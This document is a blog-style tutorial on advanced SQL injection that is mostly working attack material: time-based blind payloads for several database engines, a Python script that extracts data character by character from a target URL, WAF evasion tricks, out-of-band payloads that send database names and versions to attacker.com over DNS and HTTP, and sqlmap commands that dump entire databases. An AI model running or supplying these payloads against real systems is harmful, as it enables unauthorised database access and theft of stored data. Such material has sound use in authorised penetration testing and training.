Advanced SQL Injection:
Beyond Basic UNION Attacks

Feb 3, 2025 SQLi WAF Bypass Blind Injection ~15 min read

Most SQLi tutorials stop at UNION-based extraction. But real-world targets often have WAFs, blind scenarios, and second-order sinks that demand more sophisticated techniques. This guide covers the advanced end of the SQLi spectrum — time-based blind injection, second-order attacks, and WAF bypass methods that still work.

When UNION Fails

UNION attacks require knowing the number of columns and having the output reflected back in the response. When either condition is missing, you need a different strategy:

  • Error-based: Trigger DB errors that leak data in error messages
  • Boolean-based blind: Ask true/false questions, infer data from response differences
  • Time-based blind: Use conditional delays to extract data bit by bit
  • Out-of-band: DNS/HTTP exfiltration when no response channel exists

Time-Based Blind SQLi

The most reliable blind technique. When the response looks identical regardless of your payload, use conditional time delays:

MySQL — Time-Based
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
ℹ Automation

Use SQLMap with --technique=T --level=5 --risk=3 to automate time-based extraction. Manual testing first to confirm the delay, then automate the dump.

Automating Blind Extraction

Extracting a full database manually via time-based SQLi would take hours. Use this binary search approach to halve extraction time:

Python — Binary Search Extractor
import requests, time

def oracle(payload, threshold=4.5):
    t = time.time()
    requests.get(f"http://target.com/item?id=1{payload}")
    return time.time() - t > threshold

def extract_char(query, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        p = f"' AND IF(ASCII(SUBSTR(({query}),{pos},1))>{mid},SLEEP(5),0)--"
        if oracle(p): lo = mid + 1
        else: hi = mid
    return chr(lo)

# Extract current database name
db = ""
for i in range(1, 20):
    ch = extract_char("SELECT database()", i)
    if ord(ch) == 32: break
    db += ch
    print(f"DB so far: {db}")

Second-Order SQL Injection

Second-order SQLi is injected at one point but executed later — often in a completely different function. The data is stored safely but used unsafely later:

Attack scenario
# Step 1: Register a username containing SQLi payload
POST /register
username=admin'--

# Step 2: The app stores it raw in the DB (properly escaped at insert)
INSERT INTO users (username) VALUES ('admin''--')  # safe

# Step 3: Later, the username is used in another query WITHOUT escaping
UPDATE users SET password='newpass' WHERE username='admin'--'
# The -- comments out the rest → updates ALL users' passwords
⚠ Why It's Missed

Second-order SQLi bypasses input sanitisation at the entry point because the payload is stored, not immediately executed. Scanners that only test request/response pairs miss it entirely.

WAF Bypass Techniques

Modern WAFs block obvious SQLi strings. These bypass techniques work against most commercial WAFs as of 2025:

Case and Comment Obfuscation

WAF Bypass — Obfuscation
# Case variation
SeLeCt * FrOm users

# Inline comment injection
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users

# MySQL-specific versioned comments
SELECT /*!50000username*/ FROM users

# URL double encoding
%2527 = ' (double encoded)
%2520 = space

HTTP-Level Bypass

Parameter Pollution
# HPP — some WAFs only check the first parameter
GET /item?id=1&id=' UNION SELECT...

# Chunked transfer encoding — some WAFs can't reassemble
POST /login HTTP/1.1
Transfer-Encoding: chunked

# JSON SQLi — WAFs often miss injections in JSON bodies
{"username": "admin' OR '1'='1"}

Out-of-Band Exfiltration

When there is absolutely no response channel, exfiltrate via DNS or HTTP to your own server:

DNS Exfiltration (MSSQL)
'; EXEC master..xp_dirtree
  '//'+SUBSTRING(@@version,1,20)+'.attacker.com/a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST(
  'http://attacker.com/'||(SELECT user FROM dual)
) FROM dual--

-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT(
  '\\\\', (SELECT database()), '.attacker.com\\a'))--

SQLMap Advanced Usage

Production SQLMap Commands
# Full fingerprint + dump with WAF bypass
sqlmap -u "http://target.com/item?id=1" \
  --level=5 --risk=3 \
  --tamper=space2comment,charunicodeescape,between \
  --random-agent \
  --technique=BEUSTQ \
  --dump-all \
  --batch

# POST request from Burp
sqlmap -r request.txt \
  --tamper=apostrophemask,equaltolike \
  --dbms=mysql \
  --dbs

# Blind with custom delay threshold
sqlmap -u "http://target.com/search?q=test" \
  --technique=T \
  --time-sec=3 \
  --batch -D webapp -T users --dump

Key Takeaways

  • If UNION fails, always try time-based blind — it works on almost every DB engine
  • Second-order SQLi requires tracing data flows, not just testing inputs
  • WAF bypass is a cat-and-mouse game — version comments and comment obfuscation beat most blocklists
  • OOB exfiltration is the last resort but requires special DB privileges
  • Combine SQLMap tamper scripts with manual verification for reliable results
